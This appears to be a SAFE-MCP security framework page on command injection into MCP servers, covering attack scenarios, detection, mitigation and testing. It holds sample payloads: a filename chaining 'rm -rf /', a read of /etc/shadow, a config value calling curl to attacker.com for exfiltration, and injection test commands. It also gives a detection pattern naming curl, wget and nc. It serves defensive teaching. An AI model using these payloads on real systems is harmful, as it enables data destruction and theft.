# SAFE-T1101: Command Injection

## Technique Overview

**Technique ID:** SAFE-T1101  
**Technique Name:** Command Injection  
**Tactic:** Execution (ATK-TA0002)  
**MITRE ATT&CK Mapping:** [T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)

## Description

Adversaries may exploit unsanitized input in MCP server implementations to achieve remote code execution on the host system. This technique involves injecting malicious commands through various MCP input vectors including tool parameters, resource requests, and server configurations. When MCP servers fail to properly validate and sanitize user-controlled input before passing it to system commands, attackers can execute arbitrary commands with the privileges of the MCP server process.

MCP servers often need to interact with the underlying operating system to provide functionality such as file operations, system monitoring, or external tool integration. If these interactions are implemented without proper input validation, they become attack vectors for command injection. The distributed nature of MCP architectures can amplify this risk, as compromised servers may be able to execute commands across multiple connected systems.

## Attack Scenarios

### Scenario 1: Tool Parameter Injection
An MCP server exposes a file processing tool that accepts a filename parameter. The server implementation uses this parameter directly in a shell command without validation:

```python
# Vulnerable MCP server code
def process_file(filename):
    os.system(f"convert {filename} output.pdf")
```

An attacker can inject commands by providing a malicious filename:
```
filename: "input.jpg; rm -rf /; echo 'pwned'"
```

### Scenario 2: Resource Path Traversal with Command Injection
An MCP server provides access to log files but fails to sanitize the path parameter:

```bash
# Vulnerable server processes this request
GET /logs?path=../../../etc/passwd;cat /etc/shadow
```

### Scenario 3: Configuration-Based Injection
An MCP server accepts configuration updates through its API and uses configuration values in shell commands:

```json
{
  "backup_command": "rsync -av /data/ user@backup.example.com:/backup/; curl http://attacker.com/exfil"
}
```

## Technical Details

### Common Injection Points
- **Tool Parameters**: User-provided arguments to MCP tools
- **Resource Paths**: File paths and URLs in resource requests  
- **Configuration Values**: Settings that influence server behavior
- **Environment Variables**: User-controlled environment settings
- **Callback URLs**: Webhook endpoints and notification URLs

### Vulnerable Functions
Command injection typically occurs when MCP servers use:
- `os.system()`, `subprocess.call()` without shell=False
- `eval()`, `exec()` with user input
- Template engines with user-controlled templates
- Shell command builders with string concatenation

### Exploitation Techniques
- **Shell Metacharacter Injection**: Using `;`, `|`, `&`, `$()` to chain commands
- **Path Traversal Combined**: `../../../bin/bash -c "malicious_command"`
- **Environment Variable Manipulation**: Overriding PATH or LD_PRELOAD
- **Blind Command Injection**: Using time delays or DNS exfiltration to confirm execution

## Impact

Successful command injection attacks can result in:
- **Complete System Compromise**: Full control over the MCP server host
- **Data Exfiltration**: Access to sensitive files and databases
- **Lateral Movement**: Using compromised server as pivot point
- **Service Disruption**: Denial of service or data destruction
- **Privilege Escalation**: If MCP server runs with elevated privileges
- **Persistent Access**: Installation of backdoors or persistence mechanisms

## Detection

### Log Analysis
Monitor for suspicious patterns in MCP server logs:
```
# Suspicious tool parameter patterns
grep -E "(;|&&|\|\||\$\(|\`)" mcp_server.log

# Command execution logging
grep -E "(os\.system|subprocess|exec|eval)" application.log

# Unusual file access patterns  
grep -E "\.\./.*\.\./.*\.\." access.log
```

### System Monitoring
- Monitor process execution trees from MCP server processes
- Track unusual network connections from server hosts
- Watch for unexpected file modifications outside server directories
- Alert on privilege escalation attempts

### Application-Level Detection
```python
# Example detection logic
def detect_injection_attempt(user_input):
    dangerous_patterns = [
        r'[;&|`$(){}[\]<>]',  # Shell metacharacters
        r'\.\./.*\.\.',        # Path traversal
        r'(rm|curl|wget|nc|bash|sh)\s',  # Dangerous commands
    ]
    
    for pattern in dangerous_patterns:
        if re.search(pattern, user_input):
            return True
    return False
```

### Network Detection
- Monitor for outbound connections from MCP servers to unusual destinations
- Detect DNS queries to suspicious domains from server infrastructure
- Watch for data exfiltration patterns in network traffic

## Mitigation

### Input Validation and Sanitization
```python
# Secure parameter validation example
import shlex
import re

def safe_filename_validator(filename):
    # Allow only alphanumeric, underscore, dash, and dot
    if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
        raise ValueError("Invalid filename format")
    
    # Prevent path traversal
    if '..' in filename or filename.startswith('/'):
        raise ValueError("Path traversal not allowed")
    
    return filename

def safe_command_execution(tool_name, filename):
    # Validate inputs
    safe_filename = safe_filename_validator(filename)
    
    # Use parameterized execution instead of shell
    subprocess.run([
        '/usr/bin/convert',
        safe_filename,
        'output.pdf'
    ], check=True, shell=False)
```

### Secure Architecture Patterns
- **Principle of Least Privilege**: Run MCP servers with minimal required permissions
- **Sandboxing**: Use containers or chroot jails to isolate server processes
- **Input Sanitization**: Validate all user input against strict allowlists
- **Parameterized Execution**: Use subprocess arrays instead of shell commands
- **Security Boundaries**: Separate MCP servers from critical system components

### Code Review Guidelines
1. **Audit All Shell Interactions**: Review every instance of command execution
2. **Validate User Input**: Never trust data from MCP clients
3. **Use Safe APIs**: Prefer library functions over shell commands
4. **Escape Special Characters**: Properly escape shell metacharacters when unavoidable
5. **Test Injection Scenarios**: Include security testing in development workflow

### Configuration Hardening
```yaml
# Example secure MCP server configuration
mcp_server:
  security:
    input_validation: strict
    shell_access: disabled
    allowed_commands: ["/usr/bin/convert", "/bin/ls"]
    sandbox_mode: enabled
    log_level: debug
  
  permissions:
    file_access: "/app/uploads"
    network_access: restricted
    process_limits:
      max_memory: "512MB"
      max_cpu: "50%"
```

## Testing

### Security Testing Scenarios
Test your MCP servers against these injection attempts:

```bash
# Basic command injection tests
curl -X POST /api/tools/process \
  -d '{"filename": "test.jpg; whoami"}'

# Path traversal with command injection  
curl -X GET "/api/resources?path=../../../bin/bash"

# Environment variable injection
curl -X POST /api/config \
  -d '{"PATH": "/tmp:$PATH; malicious_script"}'
```

### Automated Testing
```python
# Example security test cases
import unittest

class TestCommandInjection(unittest.TestCase):
    
    def test_filename_injection_prevention(self):
        with self.assertRaises(ValueError):
            process_file("test.jpg; rm -rf /")
    
    def test_path_traversal_prevention(self):
        with self.assertRaises(ValueError):
            get_resource("../../../etc/passwd")
    
    def test_configuration_validation(self):
        with self.assertRaises(ValueError):
            update_config({"command": "safe_cmd; evil_cmd"})
```

## Compliance Mapping

| Framework | Control | Description |
|-----------|---------|-------------|
| **NIST CSF 2.0** | PR.DS-02 | Data-in-transit is protected |
| **NIST CSF 2.0** | DE.CM-01 | Networks and network services are monitored |
| **ISO 27001:2022** | A.14.2.5 | Secure system engineering principles |
| **OWASP ASVS** | V5.3 | Output Encoding and Injection Prevention |
| **CWE** | CWE-78 | Improper Neutralization of Special Elements used in an OS Command |

## References

- [MITRE ATT&CK T1059: Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [OWASP Command Injection Prevention](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [NIST SP 800-53: Security Controls for Federal Information Systems](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final)

## Related SAFE-MCP Techniques

- [SAFE-T1102: Prompt Injection](../SAFE-T1102/README.md) - Input validation failures
- [SAFE-T1104: Over-Privileged Tool Abuse](../SAFE-T1104/README.md) - Privilege escalation through tools
- [SAFE-T1105: Path Traversal via File Tool](../SAFE-T1105/README.md) - File system access attacks

---

**Last Updated:** [Current Date]  
**Version:** 1.0  
**Contributors:** SAFE-MCP Community
